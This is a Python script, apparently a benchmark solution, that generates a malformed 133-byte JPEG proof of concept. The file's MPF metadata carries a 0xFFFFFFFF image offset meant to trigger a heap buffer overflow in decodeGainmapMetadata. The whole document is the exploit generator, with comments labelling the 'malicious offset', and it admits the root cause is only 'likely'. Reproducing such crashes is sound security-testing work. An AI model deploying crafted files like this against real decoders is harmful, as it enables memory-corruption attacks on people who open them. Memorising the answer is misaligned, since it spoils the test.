import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in decodeGainmapMetadata.
        The vulnerability is caused by an unsigned subtraction wrap-around when handling 
        metadata offsets, likely within the MPF (Multi-Picture Format) segment of a JPEG.
        """
        
        # 1. JPEG Start of Image (SOI)
        poc = b'\xFF\xD8'
        
        # 2. APP2 Marker (Used for MPF metadata)
        poc += b'\xFF\xE2'
        
        # 3. APP2 Segment Length
        # We target a total file size of 133 bytes to match the ground truth.
        # Structure: SOI (2) + Marker (2) + Length (2) + Payload (127) = 133 bytes.
        # The Length field in JPEG markers includes the 2 bytes of the length field itself.
        # So, Length = 127 + 2 = 129 (0x0081).
        poc += struct.pack('>H', 129)
        
        # 4. APP2 Payload (MPF Structure)
        # MPF Signature "MPF\0"
        payload = b'MPF\x00'
        
        # TIFF Header (Little Endian)
        # II (0x4949), Version 42 (0x002A), Offset to 0th IFD (0x00000008)
        # The offset 8 is relative to the start of this TIFF header (byte 4 of payload).
        payload += b'\x49\x49\x2A\x00\x08\x00\x00\x00'
        
        # IFD (Image File Directory)
        # Number of entries: 1
        payload += b'\x01\x00'
        
        # Entry 0: MPEntry Tag (0xB002)
        # Type: Undefined (7), Count: 16 bytes
        # Offset: 26 (0x0000001A)
        # Offset calculation: 
        #   Header (8) + Count (2) + Tag (12) + NextIFD (4) = 26 bytes used.
        #   So offset 26 points exactly after the NextIFD field.
        payload += b'\x02\xB0'             # Tag ID
        payload += b'\x07\x00'             # Type
        payload += b'\x10\x00\x00\x00'     # Count (16)
        payload += b'\x1A\x00\x00\x00'     # Value Offset (26)
        
        # Next IFD Offset (0 - None)
        payload += b'\x00\x00\x00\x00'
        
        # MPEntry Data (16 bytes) located at Offset 26
        # Structure: Attribute(4), Size(4), Offset(4), Dep1(2), Dep2(2)
        # Vulnerability Trigger:
        # Setting the Image Offset to a large value (0xFFFFFFFF) causes an unsigned
        # subtraction underflow or out-of-bounds calculation in decodeGainmapMetadata,
        # leading to a Heap Buffer Overflow.
        
        mp_attr = b'\x00\x00\x00\x00'
        mp_size = b'\x00\x00\x00\x00'
        mp_offset = b'\xFF\xFF\xFF\xFF'    # Malicious Offset
        mp_deps = b'\x00\x00\x00\x00'
        
        payload += mp_attr + mp_size + mp_offset + mp_deps
        
        # 5. Padding
        # Ensure the payload is exactly 127 bytes to meet the size constraint.
        # Current length: 4 (Sig) + 8 (Head) + 2 (Count) + 12 (Tag) + 4 (Next) + 16 (Data) = 46 bytes.
        # Padding needed: 127 - 46 = 81 bytes.
        payload += b'\x00' * (127 - len(payload))
        
        poc += payload
        
        return poc